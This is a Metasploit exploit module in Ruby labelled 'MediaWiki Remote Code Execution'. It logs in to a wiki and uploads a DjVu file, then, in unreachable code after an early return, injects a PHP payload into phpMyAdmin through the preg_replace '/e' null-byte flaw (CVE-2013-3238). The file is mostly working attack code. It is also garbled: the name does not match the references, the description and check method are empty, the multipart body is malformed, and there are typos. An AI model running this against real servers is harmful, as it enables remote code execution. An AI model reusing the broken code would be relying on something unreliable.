##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'MediaWiki Remote Code Execution',
      'Description' => %q{
      },
      'Author' =>
        [
          'Janek "waraxe" Vind', # Discovery
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>', # Metasploit Module
          'Ben Harris'
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', '2013-3238' ],
          [ 'PMASA', '2013-2'],
          [ 'waraxe', '2013-SA#103' ],
          [ 'EDB', '25003'],
          [ 'OSVDB', '92793'],
          [ 'URL', 'http://www.waraxe.us/advisory-103.html' ],
          [ 'URL', 'http://www.phpmyadmin.net/home_page/security/PMASA-2013-2.php' ]
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
          # Clear out PMA's error handler so it doesn't lose its mind
          # and cause ENOMEM errors and segfaults in the destructor.
          'Prepend' => "function foo($a,$b,$c,$d,$e){return true;};set_error_handler(foo);"
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 25 2013'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base phpMyAdmin directory path", '/index.php']),
        OptString.new('USERNAME', [ true, "Username to authenticate with", 'root']),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", ''])
      ], self.class)
  end

  def check
  end

  def exploit

    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    uri = target_uri.path

    print_status("Grabbing CSRF token...")
    response = send_request_cgi({
      'uri' => uri,
      'vars_get' => { 'title' => 'Special:UserLogin' }
    })
    if response.nil?
      fail_with(Failure::NotFound, "Failed to retrieve webpage.")
    end

    session_cookie = response.get_cookies

    if (response.body !~ /"wpLoginToken"\s*value="([^"]*)"/)
      fail_with(Failure::NotFound, "Couldn't find login token. Is URI set correctly?")
    else
      print_good("Retrieved login token")
    end

    wp_login_token = $1
    puts wp_login_token.inspect

    login = send_request_cgi({
      'uri' => uri,
      'method' => 'POST',
      'vars_get' => {
        'title' => 'Special:UserLogin',
        'action' => 'submitlogin',
        'type' => 'login'
      },
      'cookie' => session_cookie,
      'vars_post' => {
        'wpName' => username,
        'wpPassword' => password,
        'wpLoginAttempt' => 'Log+in',
        'wpLoginToken' => wp_login_token
      }
    })

    if login.nil?
      fail_with(Failure::NotFound, "Failoed to retrieve webpage.")
    end

    auth_cookie = login.get_cookies.gsub('mediawikiToken=deleted;','')

    edit = send_request_cgi({
      'uri' => normalize_uri(uri, "/Special:Upload"),
      'cookie' => auth_cookie
    })

    if edit.nil?
      fail_with(Failure::NotFound, "Failed to retrieve webpage.")
    end

    if (edit.body !~ /"wpEditToken".*value="([^"]*)"/)
      fail_with(Failure::NotFound, "Couldn't find edit token. Is URI set correctly?")
    else
      print_good("Retrieved edit token")
    end

    wp_edit_token = $1

    upload_mime = Rex::MIME::Message.new

    djvu_file = ::File.read(::File.join(Msf::Config.data_directory, "exploits", "Alice_in_Wonderland.djvu"))
    file_name = rand_text_alpha(4)

    #upload_mime.add_part(djvu_file, "application/octet-stream", nil, "form-data; name=\"wpUploadFile\"; filename=\"#{file_name}.djvu\"")
    #upload_mime.add_part("#{file_name}.djvu", nil, nil, "form-data; name=\"wpDestFile\"")
    #upload_mime.add_part("", nil, nil, "form-data; name=\"wpUploadDescription\"")
    #upload_mime.add_part("", nil, nil, "form-data; name=\"wpLicense\"")
    #upload_mime.add_part(wp_edit_token, nil, nil, "form-data; name=\"wpEditToken\"")
    #upload_mime.add_part("Special:Upload", nil, nil, "form-data; name=\"title\"")
    #upload_mime.add_part("1", nil, nil, "form-data; name=\"wpDestFileWarningAck\"")
    #upload_mime.add_part("Upload file", nil, nil, "form-data; name=\"wpUpload\"")
    content_sep= "---------------------------23909616611238\r\n"

    upload_mime = content_sep
    upload_mime << "Content-Disposition: form-data; name=\"wpUploadFile\"; filename=\"#{file_name}\"\r\n"
    upload_mime << "Content-Type: application/octet-stream\r\n"
    upload_mime << djvu_file
    upload_mime << "Content-Disposition: form-data; name=\"wpDestFile\"\r\n"
    upload_mime << "\r\n"
    upload_mime << "#{file_name}\r\n"
    upload_mime << content_sep
    upload_mime << "Content-Disposition: form-data; name=\"wpUploadDescription\"\r\n"
    upload_mime << "\r\n"
    upload_mime << content_sep
    upload_mime << "Content-Disposition: form-data; name=\"wpLicense\"\r\n"
    upload_mime << "\r\n"
    upload_mime << content_sep
    upload_mime << "Content-Disposition: form-data; name=\"wpEditToken\"\r\n"
    upload_mime << "\r\n"
    upload_mime << "#{wp_edit_token}\r\n"
    upload_mime << content_sep
    upload_mime << "Content-Disposition: form-data; name=\"title\"\r\n"
    upload_mime << "\r\n"
    upload_mime << "Special:Upload\r\n"
    upload_mime << content_sep
    upload_mime << "Content-Disposition: form-data; name=\"wpDestFileWarningAck\"\r\n"
    upload_mime << "\r\n"
    upload_mime << "1\r\n"
    upload_mime << content_sep
    upload_mime << "Content-Disposition: form-data; name=\"wpUpload\"\r\n"
    upload_mime << "\r\n"
    upload_mime << "Upload file"
    upload_mime << content_sep

    upload = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, "Special:Upload"),
      'cookie' => auth_cookie,
      'data'   => upload_mime.to_s,
      'headers' => {
        'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language' => 'en-us,en;q=0.5',
        'Accept-Encoding' => 'gzip,deflate',
        'Connection'      => 'Keep-Alive',
      },
      'ctype'  => "multipart/form-data; boundary=#{content_sep.gsub("\r\n")}"
    })

    puts upload.headers

    return


    post = {
      'token' => token,
      'pma_username' => datastore['USERNAME'],
      'pma_password' => datastore['PASSWORD']
    }

    print_status("Authenticating...")

    login = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, 'index.php'),
      'vars_post' => post
    })

    if login.nil?
      fail_with(Failure::NotFound, "Failed to retrieve webpage.")
    end

    token = login.headers['Location'].scan(/token=(.*)[&|$]/).flatten.first

    cookies = login.get_cookies

    login_check = send_request_cgi({
      'uri' => normalize_uri(uri, 'index.php'),
      'vars_get' => { 'token' => token },
      'cookie' => cookies
    })

    if login_check.body =~ /Welcome to/
      fail_with(Failure::NoAccess, "Authentication failed.")
    else
      print_good("Authentication successful")
    end

    db = rand_text_alpha(3+rand(3))
    exploit_result = send_request_cgi({
      'uri'	=> normalize_uri(uri, 'db_structure.php'),
      'method' => 'POST',
      'cookie' => cookies,
      'vars_post' => {
        'query_type' => 'replace_prefix_tbl',
        'db' => db,
        'selected[0]' => db,
        'token' => token,
        'from_prefix' => "/e\0",
        'to_prefix' => payload.encoded,
        'mult_btn' => 'Yes'
      }
    },1)
  end
end

